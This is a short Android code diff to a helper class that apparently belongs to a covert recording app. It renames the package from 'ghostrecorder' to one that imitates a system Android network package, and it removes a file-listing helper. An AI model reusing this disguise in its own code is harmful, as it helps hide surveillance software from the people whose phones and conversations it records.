@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.content.Context;
 import android.content.ContextWrapper;
@@ -10,15 +10,12 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
-import java.io.File;
-import java.util.ArrayList;
 import java.util.concurrent.TimeUnit;
 
 public class Helpers extends ContextWrapper {
 
-    String path = Environment.getExternalStorageDirectory().toString() + "/Others";
+    String path = Environment.getExternalStorageDirectory().toString() + "/" + AppGlobals.DIRECTORY_NAME;
     static String originatingAddress;
 
     public Helpers(Context base) {
@@ -55,20 +52,6 @@ public class Helpers extends ContextWrapper {
 
     static SharedPreferences getPreferenceManager(Context context) {
         return PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
-    }
-
-    ArrayList<String> getAllFilesFromDir() {
-        Log.d("Files", "Path: " + path);
-        File f = new File(path);
-        File file[] = f.listFiles();
-        ArrayList<String> arrayList = new ArrayList<String>();
-        Log.d("Files", "Size: "+ file.length);
-        for (int i=0; i < file.length; i++)
-        {
-            arrayList.add(file[i].getName());
-            Log.d("Files", "FileName:" + file[i].getName());
-        }
-        return arrayList;
     }
 
     TelephonyManager getTelephonyManager() {
